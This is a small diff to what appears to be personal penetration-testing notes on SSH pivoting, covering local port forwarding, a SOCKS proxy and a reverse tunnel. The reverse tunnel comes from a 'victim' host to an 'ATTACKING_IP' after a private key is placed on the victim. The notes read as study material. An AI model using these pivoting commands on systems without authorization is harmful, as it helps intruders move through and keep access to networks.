@@ -151,10 +151,14 @@ Match junkuser
   - ssh -L [myport]:target:[open_port_target] user@[public_ip] -fN
 - Proxy
   - ssh -D PORT user@[public_ip] -fN
+  - Proxy: SOCKS5 + PORT
+
+
 - create key pair on the attacking machine
 - transfer private key to victim
 - stablish connection from victim to attacking
   - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+  - Browser: localhost
   - executing on we habe the shell
 
 - -L ==> Port FOrwarding
